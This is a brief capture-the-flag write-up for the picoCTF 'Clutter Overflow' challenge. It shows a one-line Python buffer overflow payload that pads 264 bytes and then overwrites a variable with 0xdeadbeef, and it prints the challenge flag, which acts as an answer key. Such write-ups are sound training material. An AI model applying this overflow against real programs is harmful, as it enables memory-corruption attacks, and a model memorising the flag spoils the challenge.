# Clutter Overflow

## Solution
Analysed the code and figured out that the code variable was supposed to be 
equal to hex value 0xdeadbeef and had to be typed out after 264 characters
which could be anything so i entered the password as a random 264 character
string followed by deadbeef using 
```
python -c "print 'A'*264 + '\xef\xbe\xad\xde'"
```



## Flag
```
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
```
